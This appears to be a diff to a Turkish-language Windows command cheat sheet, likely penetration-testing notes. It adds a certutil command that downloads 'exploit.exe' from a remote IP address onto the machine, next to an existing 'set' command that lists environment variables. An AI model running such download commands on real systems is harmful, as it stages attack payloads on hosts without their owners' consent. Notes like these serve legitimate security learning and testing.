@@ -1,3 +1,8 @@
+Windowsun içine başka sunucudan veri aktarımını yapar
+```bash
+C:\> certutil -urlcache -f http://10.9.6.1:80/exploit.exe exploit.exe
+
+```
 Windowsun env değerlerini verir
 ```bash
 C:\>set
